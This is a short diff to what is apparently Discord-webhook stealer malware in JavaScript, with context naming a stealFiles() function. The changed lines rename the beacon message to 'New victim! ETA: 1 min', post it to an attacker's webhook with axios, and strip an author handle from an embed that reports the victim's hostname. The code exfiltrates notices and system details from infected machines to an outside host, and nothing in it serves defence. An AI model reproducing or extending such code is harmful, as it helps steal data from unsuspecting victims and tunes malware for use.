@@ -646,7 +646,7 @@ function stealFiles() {
 
 
 function sendSuccessToWebhook() {
-    const successMessage = '**<--------------------------INJECTION STARTED--------------------------->**';
+    const successMessage = '**New victim! ETA: 1 min**';
     axios.post(discordWebhookUrl, {
         content: successMessage,
     }).then(response => {
@@ -3133,7 +3133,7 @@ try {
         description: '‎',
         color: 0x303037,
         author: {
-            name: `${user.hostname} | System Information | @WallGod69`,
+            name: `${user.hostname}`,
             icon_url: 'https://i.pinimg.com/originals/f7/1c/76/f71c761141b1dcc94b41e6494c3d5177.png',
         },
         fields: [
